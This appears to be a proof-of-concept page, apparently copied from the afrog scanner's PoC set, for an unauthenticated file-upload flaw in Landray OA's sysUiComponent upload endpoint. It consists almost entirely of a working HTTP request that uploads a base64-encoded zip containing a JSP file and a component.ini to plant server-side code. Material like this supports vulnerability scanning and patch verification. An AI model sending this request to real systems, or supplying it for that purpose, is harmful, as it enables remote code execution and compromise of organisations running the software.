# landray_oa_sysuicomponent_fieupload

from: https://github.com/zan8in/afrog/blob/da48a07b58989c01648ae96a8fcb37b6890f6c9d/v2/pocs/afrog-pocs/vulnerability/landray-oa-sysuicomponent-fileupload.yaml#L47
```
POST /sys/ui/sys_ui_component/sysUiComponent.do?method=upload HTTP/1.1
Host: xxx
Connection: close
Accept-Encoding: gzip, deflate, br
Accept: */*
User-Agent: python-requests/2.27.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary848412406
Content-Length: 541

------WebKitFormBoundary848412406
Content-Disposition: form-data; name="file"; filename="xxx.zip"
Content-Type: application/x-zip-compressed

{{base64Decode("UEsDBBQAAAAIAEVrcFcd+E8oKAAAACYAAAAIAAAAdGVzdC5qc3CzUVXILy3RKyjKzCvJydNQ8iotLkl0TCwOCE4zNDIyNlLStFZQtQMAUEsDBBQAAAAIAGlrcFdRNnIYHAAAABoAAAANAAAAY29tcG9uZW50LmluactMsTUyMLQ0Mrbg5cpLzE21Tc5ITc7WK6koAQBQSwECHwAUAAAACABFa3BXHfhPKCgAAAAmAAAACAAkAAAAAAAAACAAAAAAAAAAdGVzdC5qc3AKACAAAAAAAAEAGAB3R8xoTRjaAXdHzGhNGNoBRiZA9UIY2gFQSwECHwAUAAAACABpa3BXUTZyGBwAAAAaAAAADQAkAAAAAAAAACAAAABOAAAAY29tcG9uZW50LmluaQoAIAAAAAAAAQAYACmZwpFNGNoBKZnCkU0Y2gF5vhgvSxjaAVBLBQYAAAAAAgACALkAAACVAAAAAAA=")}}
```
